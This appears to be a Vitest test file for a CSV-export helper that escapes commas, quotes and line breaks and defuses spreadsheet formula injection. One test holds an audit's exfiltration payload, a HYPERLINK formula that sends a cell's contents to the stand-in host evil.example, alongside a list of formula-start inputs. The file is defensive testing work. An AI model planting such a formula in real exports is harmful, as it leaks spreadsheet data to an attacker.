import { describe, expect, it } from "vitest";
import { csvCell, csvRow } from "@/lib/csv";

describe("csvCell", () => {
  it("leaves plain text alone", () => {
    expect(csvCell("Glow Beauty Co")).toBe("Glow Beauty Co");
  });

  it("quotes commas, quotes and line breaks", () => {
    expect(csvCell('a,"b"')).toBe('"a,""b"""');
    expect(csvCell("one\ntwo")).toBe('"one\ntwo"');
  });

  it.each(["=SUM(A1)", "+1+1", "-2+3", "@cmd", "\tx", "\rx"])("defuses a formula start: %j", (value) => {
    const cell = csvCell(value);
    expect(cell.replace(/^"/, "").startsWith("'")).toBe(true);
  });

  it("defuses the payload used in the audit", () => {
    expect(csvCell('=HYPERLINK("http://evil.example/?c="&A2,"Click")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/?c=""&A2,""Click"")"',
    );
  });

  it("joins a row", () => {
    expect(csvRow(["a", "=b", "c,d"])).toBe("a,'=b,\"c,d\"");
  });
});
